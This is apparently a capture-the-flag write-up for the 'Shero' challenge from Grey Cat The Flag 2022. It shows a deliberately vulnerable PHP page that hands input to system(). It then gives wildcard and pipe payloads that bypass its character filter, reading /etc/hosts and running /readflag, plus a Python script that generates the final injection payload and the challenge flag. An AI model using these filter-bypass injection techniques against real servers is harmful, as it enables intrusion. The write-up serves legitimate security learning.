# Grey Cat The Flag 2022

## Qualifiers

| Challenge                                | Category | Value |
| ---------------------------------------- | -------- | ----- |
| Data Degeneration                        | Misc     | 394   |
| Logical Computers                        | Misc     | 467   |
| Quotes                                   | Web      | 485   |
| SelNode                                  | Web      | 467   |
| Grapache                                 | Web      | 493   |
| [Shero](grey-cat-the-flag-2022.md#shero) | Web      | 495   |

## Shero

> We like cat, so don't abuse it please =(
>
> * 复读机

The premise of this challenge was quite simple. We are given the following source code, with the goal of finding the flag somewhere on the server.

```php
<?php
    $file = $_GET['f'];
    if (!$file) highlight_file(__FILE__);

    if (preg_match('#[^.cat!? /\|\-\[\]\(\)\$]#', $file)) {
        die("cat only");
    }

    if (isset($file)) {
        system("cat " . $file);
    }
?>
```

By supplying a `?f=` GET request parameter, we can run commands on the server. One problem though - the regex filter is more than a little restrictive.

![](<../.gitbook/assets/Screenshot 2022-06-09 at 10.57.05 PM.png>)

This is the part where the challenge turns from a web challenge to a command injection filter bypass challenge :sob:

The list of allowed characters are as follows:

* `.`
* `c`
* `a`
* `t`
* `!`
* `?`
* &#x20;``&#x20;
* `/`
* `|`
* `-`
* `[`
* `]`
* `(`
* `)`
* `$`

### Reading Arbitrary Files

One trick to bypass the character filter and run commands other than `cat` is to use [wildcards](https://tldp.org/LDP/GNU-Linux-Tools-Summary/html/x11655.htm). In particular, the `?` wildcard character is used to match any single character.

For example, using `cat /?tc/???t?`, we could read the `/etc/hosts` file.

![](<../.gitbook/assets/Screenshot 2022-06-09 at 11.31.41 PM.png>)

Using `cat /????????` yielded this very interesting-looking binary. At first glance, it contained the string `readflag.c`, so we could guess that this binary is probably called `readflag` and it runs with elevated permissions to read a flag file somewhere (so that we need RCE instead of simple file reading)

![](<../.gitbook/assets/Screenshot 2022-06-09 at 11.25.14 PM.png>)

If we download the binary and open it up in a decompiler, we would see that we need to pass the string `sRPd45w_0` as an argument (`argv[1]`) in order to read the flag. This was the result of rearranging the letters in the string `P4s5_w0Rd`.

![](<../.gitbook/assets/Screenshot 2022-06-09 at 11.33.44 PM.png>)

### Running Arbitrary Commands

Since the `|` character is allowed, we are able to use piping to terminate the `cat` command and start a new command. For example, using `?f=| /??a???a?` will translate to `cat | /??a???a?`, which runs the `/readflag` binary.

![](<../.gitbook/assets/Screenshot 2022-06-09 at 11.37.19 PM.png>)

### Passing the Argument

Now comes the torturous part. How do we get arbitrary characters to use as the password?

One thing that might help is that `$()` is allowed, so we could use [command substitution](https://www.gnu.org/software/bash/manual/html\_node/Command-Substitution.html) to get the strings we need.

When reading the binary previously, we could see that the string `P4s5_w0Rd` is in the binary. If we could run `strings` on the binary, somehow extract only the password string, and rearrange the letters, we could use command substitution to pass the correct password as an argument.

We could run `/usr/bin/strings /readflag` using `/???/???/?t????? /??a???a?`&#x20;

![](<../.gitbook/assets/Screenshot 2022-06-09 at 11.51.19 PM.png>)

Now we need some way of filtering out the rest of the strings and only keeping the relevant `P4s5_w0Rd` string. I came across [this writeup](https://github.com/InfoSecIITR/write-ups/tree/master/2016/33c3-ctf-2016/misc/hohoho) of a similar command injection challenge where the author used `/etc/alternatives/nawk` to filter output using regex, so I decided to try something similar.

Luckily enough, many useful regex characters are allowed - in particular, `.`, `[` and `]` are very useful. This allowed me to construct a regex that leaves only the password string.

![](<../.gitbook/assets/Screenshot 2022-06-09 at 11.56.15 PM.png>)

Using `/???/???/?t????? /???????? | /???/a?t???a?????/?a?? /[.-t][.-a][.-t][.-a][!-a].[.-a][.-t][c-t]/`, we can get the `P4s5_w0Rd` string!

![](<../.gitbook/assets/Screenshot 2022-06-10 at 12.00.36 AM.png>)

At this point, we could try passing in the string as an argument to `/readflag` using `$()`, but this will yield "Wrong Password!".

![](<../.gitbook/assets/Screenshot 2022-06-10 at 12.03.15 AM.png>)

### Rearranging the Letters

We needed a way to rearrange `P4s5_w0Rd` into `sRPd45w_0`. It would be great if we could get characters of the string at specified indices - it sure is nice that a [`cut` command](https://man7.org/linux/man-pages/man1/cut.1.html) exists for this very purpose!

By using `/???/???/c?t -cX`, we will get the character of the string at index X.

But how do we get numbers? It turns out that `$?` is one of the [special parameters](https://gnu.org/software/bash/manual/html\_node/Special-Parameters.html) in bash, containing the exit status code of the previous command. If the exit code is non-zero, then `$? / $?` will yield `1`, `$? / $? -- $? / $?` will yield `2`, and so on. If the exit code is zero, this method will lead to a division by zero error.

But how do we make the exit code non-zero? We just need to place an extra bogus command in front of it: `(a || /???/???/c?t -c$(($? / $?)))`.

Here's the script to generate the payload required to reconstruct the password string.

```python
original = "P4s5_w0Rd"
target = "sRPd45w_0"

final = ''
for char in target:
    idx = original.index(char)

    num = "$? / $?"

    for i in range(idx):
        num += "-- $? / $?"

    final += f"$(/???/???/?t????? /???????? | /???/a?t???a?????/?a?? /[.-t][.-a][.-t][.-a][!-a].[.-a][.-t][c-t]/ | (a || /???/???/c?t -c$(({num}))))"

print(final)
```

And here's the payload...

![](<../.gitbook/assets/Screenshot 2022-06-10 at 12.22.38 AM.png>)

### Putting It All Together

All we need to do now is to use the output from the previous script and put it behind `/readflag`.

![](<../.gitbook/assets/Screenshot 2022-06-10 at 12.26.47 AM.png>)

and we get the flag: `grey{r35p3c7_70_b45h_m4573r_0dd14e9bc3172d16}`.

### References

* [https://github.com/InfoSecIITR/write-ups/tree/master/2016/33c3-ctf-2016/misc/hohoho](https://github.com/InfoSecIITR/write-ups/tree/master/2016/33c3-ctf-2016/misc/hohoho)&#x20;
